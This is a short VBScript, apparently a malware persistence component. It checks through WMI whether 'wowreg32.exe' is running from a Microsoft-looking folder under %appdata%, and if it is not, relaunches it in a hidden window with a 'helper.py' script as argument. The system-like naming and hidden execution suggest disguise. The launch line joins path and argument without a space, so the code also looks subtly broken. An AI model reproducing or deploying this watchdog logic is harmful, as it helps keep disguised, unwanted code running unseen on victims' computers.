Option Explicit
Dim ProcessPath
ProcessPath = "%appdata%\MicrosoftSW\wowreg32.exe"
Call CheckProcess(DblQuote(ProcessPath))
'**************************************************************************
Sub CheckProcess(ProcessPath)
    Dim strComputer,objWMIService,colProcesses,WshShell,Tab,ProcessName
    strComputer = "."
    Tab = Split(ProcessPath,"\")
    ProcessName = Tab(UBound(Tab))
    ProcessName = Replace(ProcessName,Chr(34),"")
    'Msgbox ProcessName
    Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery _
    ("Select * from Win32_Process Where Name = '"& ProcessName & "'")
    If colProcesses.Count = 0 Then
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run ProcessPath & "%appdata%\MicrosoftSW\helper.py", 0, False
    Else
        Exit Sub
    End if
End Sub
'**************************************************************************
Function DblQuote(Str)
    DblQuote = Chr(34) & Str & Chr(34)
End Function
'**************************************************************************